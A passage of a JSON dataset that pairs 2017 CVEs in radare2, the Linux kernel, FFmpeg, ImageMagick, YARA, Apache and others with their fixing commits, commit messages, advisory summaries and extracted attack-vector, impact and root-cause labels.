attacker"},{"commit_id":"c57997e76ec70862174a1b3b3aeb62a6f8570e85","cve_id":"CVE-2017-10929","cwe_id":"CWE-119","commit_message":"Fix r2_hbo_grub_memmove ext2 crash","summary":"The grub_memmove function in shlr\/grub\/kern\/misc.c in radare2 1.5.0 allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted binary file, possibly related to a read overflow in the grub_disk_read_small_real function in kern\/disk.c in GNU GRUB 2.02.","commit_message_1":"fix r2_hbo_grub_memmove ext2 crash","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted binary file , possibly related to a read overflow in the grub _ disk _ read _ small _ real function in kern \/ disk . c in gnu grub 2 . 02","Impact":"cause a denial of service ( heap - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"089bc0143f489bd3a4578bdff5f4ca68fb26f341","cve_id":"CVE-2017-10911","cwe_id":"CWE-200","commit_message":"xen-blkback: don't leak stack data via response ring\n\nRather than constructing a local structure instance on the stack, fill\nthe fields directly on the shared ring, just like other backends do.\nBuild on the fact that all response structure flavors are actually\nidentical (the old code did make this assumption too).\n\nThis is XSA-216.\n\nCc: stable@vger.kernel.org\n\nSigned-off-by: Jan Beulich <jbeulich@suse.com>\nReviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nSigned-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>","summary":"The make_response function in drivers\/block\/xen-blkback\/blkback.c in the Linux kernel before 4.11.8 allows guest OS users to obtain sensitive information from host OS (or other guest OS) kernel memory by leveraging the copying of uninitialized padding fields in Xen block-interface response structures, aka XSA-216.","commit_message_1":"do n't leak stack data via response ring rather than constructing a local structure instance on the stack , fill the field directly on the shared ring , just like other backends do","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the copying of uninitialized padding fields in xen block - interface response structures , aka xsa - 216","Impact":"obtain sensitive information from host os kernel memory","Root Cause":"caused by the failure to properly initialize some fields of the block interface (blkif) response structure","Attack Type":"local attacker"},{"commit_id":"385aee965b4e4c36551c362a334378d2985b722a","cve_id":"CVE-2017-10810","cwe_id":"CWE-772","commit_message":"drm\/virtio: don't leak bo on drm_gem_object_init failure\n\nReported-by: \u674e\u5f3a <liqiang6-s@360.cn>\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>\nLink: http:\/\/patchwork.freedesktop.org\/patch\/msgid\/20170406155941.458-1-kraxel@redhat.com","summary":"Memory leak in the virtio_gpu_object_create function in drivers\/gpu\/drm\/virtio\/virtgpu_object.c in the Linux kernel through 4.11.8 allows attackers to cause a denial of service (memory consumption) by triggering object-initialization failures.","commit_message_1":"drm\/virtio : do n't leak bo on drm_gem_object_init failure","Vulnerability Type":"memory leak","Attack Vector":"By triggering object-initialization failures","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"8416ae54ecefa670534f27a31db71d048b9c7f16","cve_id":"CVE-2017-10807","cwe_id":"CWE-287","commit_message":"Fixed offered SASL mechanism check","summary":"JabberD 2.x (aka jabberd2) before 2.6.1 allows anyone to authenticate using SASL ANONYMOUS, even when the sasl.anonymous c2s.xml option is not enabled.","commit_message_1":"fixed offered sasl mechanism check","Vulnerability Type":"Improper Authentication","Attack Vector":"using SASL ANONYMOUS","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"c0dc63a49d8605649f1d8e4a96c9b468b0bff660","cve_id":"CVE-2017-10671","cwe_id":"CWE-119","commit_message":"Fix heap buffer overflow in de_dotdot","summary":"Heap-based Buffer Overflow in the de_dotdot function in libhttpd.c in sthttpd before 2.27.1 allows remote attackers to cause a denial of service (daemon crash) or possibly have unspecified other impact via a crafted filename.","commit_message_1":"fix heap buffer overflow in de_dotdot","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted filename","Impact":"cause a denial of service ( daemon crash ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the de_dotdot function","Attack Type":"remote attacker"},{"commit_id":"15d3042a937c13f5d9244241c7a9c8416ff6e82a","cve_id":"CVE-2017-10663","cwe_id":"CWE-129","commit_message":"f2fs: sanity check checkpoint segno and blkoff\n\nMake sure segno and blkoff read from raw image are valid.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Jin Qian <jinqian@google.com>\n[Jaegeuk Kim: adjust minor coding style]\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>","summary":"The sanity_check_ckpt function in fs\/f2fs\/super.c in the Linux kernel before 4.12.4 does not validate the blkoff and segno arrays, which allows local users to gain privileges via unspecified vectors.","commit_message_1":"sanity check checkpoint segno and blkoff make sure segno and blkoff read from raw image are valid","Vulnerability Type":"Improper Validation of Array Index","Attack Vector":"By using an unspecified vector","Impact":"gain privileges on the system","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"b9dd46188edc2f0d1f37328637860bb65a771124","cve_id":"CVE-2017-10662","cwe_id":null,"commit_message":"f2fs: sanity check segment count\n\nF2FS uses 4 bytes to represent block address. As a result, supported\nsize of disk is 16 TB and it equals to 16 * 1024 * 1024 \/ 2 segments.\n\nSigned-off-by: Jin Qian <jinqian@google.com>\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>","summary":"The sanity_check_raw_super function in fs\/f2fs\/super.c in the Linux kernel before 4.11.1 does not validate the segment count, which allows local users to gain privileges via unspecified vectors.","commit_message_1":"sanity check segment count f2fs us <number> byte to represent block address","Vulnerability Type":"unspecified","Attack Vector":"via unspecified vectors","Impact":"gain privileges","Root Cause":"does not validate the segment count","Attack Type":"local attacker"},{"commit_id":"1e38da300e1e395a15048b0af1e5305bd91402f6","cve_id":"CVE-2017-10661","cwe_id":"CWE-416","commit_message":"timerfd: Protect the might cancel mechanism proper\n\nThe handling of the might_cancel queueing is not properly protected, so\nparallel operations on the file descriptor can race with each other and\nlead to list corruptions or use after free.\n\nProtect the context for these operations with a seperate lock.\n\nThe wait queue lock cannot be reused for this because that would create a\nlock inversion scenario vs. the cancel lock. Replacing might_cancel with an\natomic (atomic_t or atomic bit) does not help either because it still can\nrace vs. the actual list operation.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: \"linux-fsdevel@vger.kernel.org\"\nCc: syzkaller <syzkaller@googlegroups.com>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: linux-fsdevel@vger.kernel.org\nLink: http:\/\/lkml.kernel.org\/r\/alpine.DEB.2.20.1701311521430.3457@nanos\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>","summary":"Race condition in fs\/timerfd.c in the Linux kernel before 4.10.15 allows local users to gain privileges or cause a denial of service (list corruption or use-after-free) via simultaneous file-descriptor operations that leverage improper might_cancel queueing.","commit_message_1":"protect the might cancel mechanism proper the handling of the might_cancel queueing is not properly protected , so parallel operation on the file descriptor can race with each other and lead to list corruption or use after free","Vulnerability Type":"Use After Free","Attack Vector":"via simultaneous file - descriptor operations that leverage improper might _ cancel queueing","Impact":"gain privileges or cause a denial of service ( list corruption or use - after - free )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"1e42736b95065c69a7481d0cf55247024f54b660","cve_id":"CVE-2017-9996","cwe_id":"CWE-119","commit_message":"avcodec\/cdxl: Check format for BGR24\n\nFixes: out of array access\nFixes: 1427\/clusterfuzz-testcase-minimized-5020737339392000\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The cdxl_decode_frame function in libavcodec\/cdxl.c in FFmpeg 2.8.x before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 does not exclude the CHUNKY format, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"avcodec\/cdxl : check format for bgr24","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service ( heap - based buffer over","Root Cause":"does not exclude the chunky format","Attack Type":"remote attacker"},{"commit_id":"7ac5067146613997bb38442cb022d7f41321a706","cve_id":"CVE-2017-9995","cwe_id":"CWE-119","commit_message":"avcodec\/scpr: Check y in first line loop in decompress_i()\n\nFixes: out of array access\nFixes: 1478\/clusterfuzz-testcase-minimized-5285486908145664\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"libavcodec\/scpr.c in FFmpeg 3.3 before 3.3.1 does not properly validate height and width data, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"avcodec\/scpr : check y in first line loop in decompress_i ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file ","Impact":"cause a denial of service ( heap - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"does not properly validate height and width data","Attack Type":"remote attacker"},{"commit_id":"6b5d3fb26fb4be48e4966e4b1d97c2165538d4ef","cve_id":"CVE-2017-9994","cwe_id":"CWE-119","commit_message":"avcodec\/webp: Always set pix_fmt\n\nFixes: out of array access\nFixes: 1434\/clusterfuzz-testcase-minimized-6314998085189632\nFixes: 1435\/clusterfuzz-testcase-minimized-6483783723253760\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nReviewed-by: \"Ronald S. Bultje\" <rsbultje@gmail.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"libavcodec\/webp.c in FFmpeg before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 does not ensure that pix_fmt is set, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file, related to the vp8_decode_mb_row_no_filter and pred8x8_128_dc_8_c functions.","commit_message_1":"avcodec\/webp : always set pix_fmt","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service ( heap - based buffer overflow and application crash ) or possibly have unspecified other impact via","Root Cause":"does not ensure that pix _ fmt is set","Attack Type":"remote attacker"},{"commit_id":"a5d849b149ca67ced2d271dc84db0bc95a548abb","cve_id":"CVE-2017-9993","cwe_id":"CWE-200","commit_message":"avformat\/avidec: Limit formats in gab2 to srt and ass\/ssa\n\nThis prevents part of one exploit leading to an information leak\n\nFound-by: Emil Lerner and Pavel Cheremushkin\nReported-by: Thierry Foucu <tfoucu@google.com>\n\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before 2.8.12, 3.0.x and 3.1.x before 3.1.9, 3.2.x before 3.2.6, and 3.3.x before 3.3.2 does not properly restrict HTTP Live Streaming filename extensions and demuxer names, which allows attackers to read arbitrary files via crafted playlist data.","commit_message_1":"limit format in gab2 to srt and ass\/ssa this prevents part of one exploit leading to an information leak","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via crafted playlist data","Impact":"read arbitrary files","Root Cause":"does not properly restrict http live streaming filename extensions and demuxer names ","Attack Type":"remote attacker"},{"commit_id":"f52fbf4f3ed02a7d872d8a102006f29b4421f360","cve_id":"CVE-2017-9992","cwe_id":"CWE-119","commit_message":"avcodec\/dfa: Fix off by 1 error\n\nFixes out of array access\nFixes: 1345\/clusterfuzz-testcase-minimized-6062963045695488\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"Heap-based buffer overflow in the decode_dds1 function in libavcodec\/dfa.c in FFmpeg before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"fix off by <number> error fix out of array access","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"441026fcb13ac23aa10edc312bdacb6445a0ad06","cve_id":"CVE-2017-9991","cwe_id":"CWE-119","commit_message":"avcodec\/xwddec: Check bpp more completely\n\nFixes out of array access\nFixes: 1399\/clusterfuzz-testcase-minimized-4866094172995584\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"Heap-based buffer overflow in the xwd_decode_frame function in libavcodec\/xwddec.c in FFmpeg before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"check bpp more completely fix out of array access","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"cb243972b121b1ae6b60a78ff55a0506c69f3879","cve_id":"CVE-2017-9990","cwe_id":"CWE-119","commit_message":"avcodec\/xpmdec: Fix multiple pointer\/memory issues\n\nMost of these were found through code review in response to\nfixing 1466\/clusterfuzz-testcase-minimized-5961584419536896\nThere is thus no testcase for most of this.\nThe initial issue was Found-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\n\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"Stack-based buffer overflow in the color_string_to_rgba function in libavcodec\/xpmdec.c in FFmpeg 3.3 before 3.3.1 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"fix multiple pointer\/memory issue most of these were found through code review in response to fixing <number>\/clusterfuzz-testcase-minimized-<number> there is thus no testcase for most of this","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"20e2b791796bd68816fa115f12be5320de2b8021","cve_id":"CVE-2017-9985","cwe_id":"CWE-125","commit_message":"ALSA: msnd: Optimize \/ harden DSP and MIDI loops\n\nThe ISA msnd drivers have loops fetching the ring-buffer head, tail\nand size values inside the loops.  Such codes are inefficient and\nfragile.\n\nThis patch optimizes it, and also adds the sanity check to avoid the\nendless loops.\n\nBugzilla: https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=196131\nBugzilla: https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=196133\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The snd_msndmidi_input_read function in sound\/isa\/msnd\/msnd_midi.c in the Linux kernel through 4.11.7 allows local users to cause a denial of service (over-boundary access) or possibly have unspecified other impact by changing the value of a message queue head pointer between two kernel reads of that value, aka a *double fetch* vulnerability.","commit_message_1":"msnd : optimize \/ harden dsp and midi loop the isa msnd driver have loop fetching the ring-buffer head , tail and size value inside the loop","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by changing the value of a message queue head pointer between two kernel reads of that value , aka a * double fetch * vulnerability","Impact":"cause a denial of service ( over - boundary access ) or possibly have unspecified other impact","Root Cause":"caused by a double-fetch error","Attack Type":"local attacker"},{"commit_id":"796dd28aaa6b9fa76d99c42c4d5ff8b257cc2191","cve_id":"CVE-2017-9949","cwe_id":"CWE-787","commit_message":"Fix ext2 buffer overflow in r2_sbu_grub_memmove","summary":"The grub_memmove function in shlr\/grub\/kern\/misc.c in radare2 1.5.0 allows remote attackers to cause a denial of service (stack-based buffer underflow and application crash) or possibly have unspecified other impact via a crafted binary file, possibly related to a buffer underflow in fs\/ext2.c in GNU GRUB 2.02.","commit_message_1":"fix ext2 buffer overflow in r2_sbu_grub_memmove","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted binary file , possibly related to a buffer underflow in fs \/ ext2 . c in gnu grub 2 . 02","Impact":"cause a denial of service ( stack - based buffer underflow and application crash ) or possibly have unspecified other impact","Root Cause":"caused by stack-based buffer underflow","Attack Type":"remote attacker"},{"commit_id":"29afdd2550b3d30a8defece2b95ae81edcf66ac9","cve_id":"CVE-2017-9798","cwe_id":"CWE-416","commit_message":"core: Disallow Methods' registration at run time (.htaccess), they may be\nused only if registered at init time (httpd.conf).\n\nCalling ap_method_register() in children processes is not the right scope\nsince it won't be shared for all requests.\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1807655 13f79535-47bb-0310-9956-ffa450edef68","summary":"Apache httpd allows remote attackers to read secret data from process memory if the Limit directive can be set in a user's .htaccess file, or if httpd.conf has certain misconfigurations, aka Optionsbleed. This affects the Apache HTTP Server through 2.2.34 and 2.4.x through 2.4.27. The attacker sends an unauthenticated OPTIONS HTTP request when attempting to read secret data. This is a use-after-free issue and thus secret data is not always sent, and the specific data depends on many factors including configuration. Exploitation with .htaccess can be blocked with a patch to the ap_limit_section function in server\/core.c.","commit_message_1":"disallow method ' registration at run time (","Vulnerability Type":"Use After Free","Attack Vector":"By sending an OPTIONS HTTP request","Impact":"read secret data from process memory if the limit directive can be set in a user ' s . htaccess file","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"65000a7fd9eea62359e6d6714f17b94a99a82edd","cve_id":"CVE-2017-9763","cwe_id":"CWE-119","commit_message":"Fix #7723 - crash in ext2 GRUB code because of variable size array in stack","summary":"The grub_ext2_read_block function in fs\/ext2.c in GNU GRUB before 2013-11-12, as used in shlr\/grub\/fs\/ext2.c in radare2 1.5.0, allows remote attackers to cause a denial of service (excessive stack use and application crash) via a crafted binary file, related to use of a variable-size stack array.","commit_message_1":"fix # <number> - crash in ext2 grub code because of variable size array in stack","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted binary file , related to use of a variable - size stack array","Impact":"cause a denial of service ( excessive stack use and application crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"00e8f205475332d7842d0f0d1481eeab4e83017c","cve_id":"CVE-2017-9761","cwe_id":"CWE-119","commit_message":"Fix #7727 - undefined pointers and out of band string access fixes","summary":"The find_eoq function in libr\/core\/cmd.c in radare2 1.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.","commit_message_1":"fix # <number> - undefined pointer and out of band string access fix","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted binary file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"31c1c0b46a7021802c3d1d18039fca30dba5a14e","cve_id":"CVE-2017-9608","cwe_id":"CWE-476","commit_message":"avcodec\/dnxhd_parser: Do not return invalid value from dnxhd_find_frame_end() on error\n\nFixes: Null pointer dereference\n\nFixes: CVE-2017-9608\nFound-by: Yihan Lian\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>\n(cherry picked from commit 611b35627488a8d0763e75c25ee0875c5b7987dd)\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The dnxhd decoder in FFmpeg before 3.2.6, and 3.3.x before 3.3.3 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted mov file.","commit_message_1":"do not return invalid value from dnxhd_find_frame_end ( ) on error ( cherry picked from commit 611b35627488a8d0763e75c25ee0875c5b7987dd )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted mov file","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"07678eca2cf9c9a18584e546c2b2a0d0c9a3150c","cve_id":"CVE-2017-9605","cwe_id":"CWE-200","commit_message":"drm\/vmwgfx: Make sure backup_handle is always valid\n\nWhen vmw_gb_surface_define_ioctl() is called with an existing buffer,\nwe end up returning an uninitialized variable in the backup_handle.\n\nThe fix is to first initialize backup_handle to 0 just to be sure, and\nsecond, when a user-provided buffer is found, we will use the\nreq->buffer_handle as the backup_handle.\n\nCc: <stable@vger.kernel.org>\nReported-by: Murray McAllister <murray.mcallister@insomniasec.com>\nSigned-off-by: Sinclair Yeh <syeh@vmware.com>\nReviewed-by: Deepak Rawat <drawat@vmware.com>","summary":"The vmw_gb_surface_define_ioctl function (accessible via DRM_IOCTL_VMW_GB_SURFACE_CREATE) in drivers\/gpu\/drm\/vmwgfx\/vmwgfx_surface.c in the Linux kernel through 4.11.4 defines a backup_handle variable but does not give it an initial value. If one attempts to create a GB surface, with a previously allocated DMA buffer to be used as a backup buffer, the backup_handle variable does not get written to and is then later returned to user space, allowing local users to obtain sensitive information from uninitialized kernel memory via a crafted ioctl call.","commit_message_1":"make sure backup_handle is always valid when vmw_gb_surface_define_ioctl ( ) is called with an existing buffer , we end up returning an uninitialized variable in the backup_handle","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By using a specially crafted ioctl call","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"5c114c91d4ff31859fcd84cf8bf349b737b90d99","cve_id":"CVE-2017-9527","cwe_id":"CWE-416","commit_message":"Clear unused stack region that may refer freed objects; fix #3596","summary":"The mark_context_stack function in gc.c in mruby through 1.2.0 allows attackers to cause a denial of service (heap-based use-after-free and application crash) or possibly have unspecified other impact via a crafted .rb file.","commit_message_1":"clear unused stack region that may refer freed object ; fix # <number>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted . rb file","Impact":"cause a denial of service ( heap - based use - after - free and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based use-after=free flaw","Attack Type":"remote attacker"},{"commit_id":"f85bc674b2a2256a364fe796351bc1971e106005","cve_id":"CVE-2017-9520","cwe_id":"CWE-416","commit_message":"Fix #7698 - UAF in r_config_set when loading a dex","summary":"The r_config_set function in libr\/config\/config.c in radare2 1.5.0 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted DEX file.","commit_message_1":"fix # <number> - uaf in r_config_set when loading a dex","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted dex file","Impact":"cause a denial of service ( use - after - free and application crash )","Root Cause":"caused by a use-after-free flaw","Attack Type":"remote attacker"},{"commit_id":"01843366d6a7b96e22ad7bb67f3df7d9fd4d5d74","cve_id":"CVE-2017-9501","cwe_id":"CWE-617","commit_message":"Fixed incorrect call to DestroyImage reported in #491.","summary":"In ImageMagick 7.0.5-7 Q16, an assertion failure was found in the function LockSemaphoreInfo, which allows attackers to cause a denial of service via a crafted file.","commit_message_1":"fixed incorrect call to destroyimage reported in # <number>","Vulnerability Type":"Reachable Assertion","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by an assertion failure","Attack Type":"remote attacker"},{"commit_id":"7fd419441bc7103398e313558171d342c6315f44","cve_id":"CVE-2017-9499","cwe_id":"CWE-617","commit_message":"Added check for incorrect number of meta channels report in #492.","summary":"In ImageMagick 7.0.5-7 Q16, an assertion failure was found in the function SetPixelChannelAttributes, which allows attackers to cause a denial of service via a crafted file.","commit_message_1":"added check for incorrect number of meta channel report in # <number>","Vulnerability Type":"Reachable Assertion","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by an assertion failure","Attack Type":"remote attacker"},{"commit_id":"992480c30f75943e9cd6245bb2015c7737f9b661","cve_id":"CVE-2017-9465","cwe_id":"CWE-125","commit_message":"Fix buffer overrun (issue #678). Add assert for detecting this kind of issues earlier.","summary":"The yr_arena_write_data function in YARA 3.6.1 allows remote attackers to cause a denial of service (buffer over-read and application crash) or obtain sensitive information from process memory via a crafted file that is mishandled in the yr_re_fast_exec function in libyara\/re.c and the _yr_scan_match_callback function in libyara\/scan.c.","commit_message_1":"fix buffer overrun ( issue # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted file that is mishandled in the yr _ re _ fast _ exec function in libyara \/ re . c and the _ yr _ scan _ match _ callback function in libyara \/ scan . c","Impact":"cause a denial of service ( buffer over - read and application crash ) or obtain sensitive information from process memory","Root Cause":"caused by a buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"d67a9ca6fd06ca65d23e313bdbad1ef4dd3aa0df","cve_id":"CVE-2017-9454","cwe_id":"CWE-125","commit_message":"ares: Prevent buffer overlow in ares_parse_a_reply (CVE-2017-9454)\n\nThis buffer overflow is in the embedded copy of ares that will be\nused unless the external alternative c-ares is used by specifying\nthe configure argument --with-c-ares.\n\nIt has been found with LibFuzzer from the LLVM project.","summary":"Buffer overflow in the ares_parse_a_reply function in the embedded ares library in ReSIProcate before 1.12.0 allows remote attackers to cause a denial of service (out-of-bounds-read) via a crafted DNS response.","commit_message_1":"prevent buffer overlow in ares_parse_a_reply ( <cve_id> ) this buffer overflow is in the embedded copy of are that will be used unless the external alternative c-ares is used by specifying the configure argument -- with-c-ares","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted dns response","Impact":"cause a denial of service ( out - of - bounds - read )","Root Cause":"caused by improper bounds checking by ares_parse_a_reply function","Attack Type":"remote attacker"},{"commit_id":"10e8bd3071677dd1fa76beeef4bc2fc427cea5e7","cve_id":"CVE-2017-9438","cwe_id":"CWE-674","commit_message":"Fix issue #674 for hex strings.","summary":"libyara\/re.c in the regexp module in YARA 3.5.0 allows remote attackers to cause a denial of service (stack consumption) via a crafted rule (involving hex strings) that is mishandled in the _yr_re_emit function, a different vulnerability than CVE-2017-9304.","commit_message_1":"fix issue # <number> for hex string","Vulnerability Type":"Uncontrolled Recursion","Attack Vector":"via a crafted rule","Impact":"cause a denial of service ( stack consumption )","Root Cause":"caused by improper validation of hex strings","Attack Type":"remote attacker"},{"commit_id":"07dbcc3d9644b18e05c1776db2a57fe04d780965","cve_id":"CVE-2017-9434","cwe_id":"CWE-125","commit_message":"Add Inflator::BadDistanceErr exception (Issue 414)\nThe improved validation and excpetion clears the Address Sanitizer and Undefined Behavior Sanitizer findings","summary":"Crypto++ (aka cryptopp) through 5.6.5 contains an out-of-bounds read vulnerability in zinflate.cpp in the Inflator filter.","commit_message_1":"exception ( issue <number> ) the improved validation and excpetion clear the address sanitizer and undefined behavior sanitizer finding","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By using a specially-crafted ZIP file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"925bcf3c3b0a28b5b78e25d9efda5c0bf27ae699","cve_id":"CVE-2017-9304","cwe_id":"CWE-674","commit_message":"Fix issue #674. Move regexp limits to limits.h.","summary":"libyara\/re.c in the regexp module in YARA 3.5.0 allows remote attackers to cause a denial of service (stack consumption) via a crafted rule that is mishandled in the _yr_re_emit function.","commit_message_1":"fix issue # <number>","Vulnerability Type":"Uncontrolled Recursion","Attack Vector":"via a crafted rule","Impact":"cause a denial of service ( stack consumption )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"03a8c630f015f63268639d3ed3bf82cff6fa77d8","cve_id":"CVE-2017-9250","cwe_id":"CWE-476","commit_message":"Do not allocate memory for zero length strings.\n\nFixes #1821.\n\nJerryScript-DCO-1.0-Signed-off-by: Zoltan Herczeg zherczeg.u-szeged@partner.samsung.com","summary":"The lexer_process_char_literal function in jerry-core\/parser\/js\/js-lexer.c in JerryScript 1.0 does not skip memory allocation for empty strings, which allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via malformed JavaScript source code, related to the jmem_heap_free_block function.","commit_message_1":"do not allocate memory for zero length string","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via malformed javascript source code , related to the jmem _ heap _ free _ block function","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"does not skip memory allocation for empty strings","Attack Type":"remote attacker"},{"commit_id":"232cd35d0804cc241eb887bb8d4d9b3b9881c64a","cve_id":"CVE-2017-9242","cwe_id":"CWE-20","commit_message":"ipv6: fix out of bound writes in __ip6_append_data()\n\nAndrey Konovalov and idaifish@gmail.com reported crashes caused by\none skb shared_info being overwritten from __ip6_append_data()\n\nAndrey program lead to following state :\n\ncopy -4200 datalen 2000 fraglen 2040\nmaxfraglen 2040 alloclen 2048 transhdrlen 0 offset 0 fraggap 6200\n\nThe skb_copy_and_csum_bits(skb_prev, maxfraglen, data + transhdrlen,\nfraggap, 0); is overwriting skb->head and skb_shared_info\n\nSince we apparently detect this rare condition too late, move the\ncode earlier to even avoid allocating skb and risking crashes.\n\nOnce again, many thanks to Andrey and syzkaller team.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nReported-by: <idaifish@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The __ip6_append_data function in net\/ipv6\/ip6_output.c in the Linux kernel through 4.11.3 is too late in checking whether an overwrite of an skb data structure may occur, which allows local users to cause a denial of service (system crash) via crafted system calls.","commit_message_1":"fix out of bound writes in __ip6_append_data ( ) andrey konovalov and idaifish @ <file> reported crash caused by one skb shared_info being overwritten from __ip6_append_data ( ) andrey program lead to following state : copy -<number> datalen <number> fraglen <number> maxfraglen <number> alloclen <number> transhdrlen <number> offset <number> fraggap <number> the 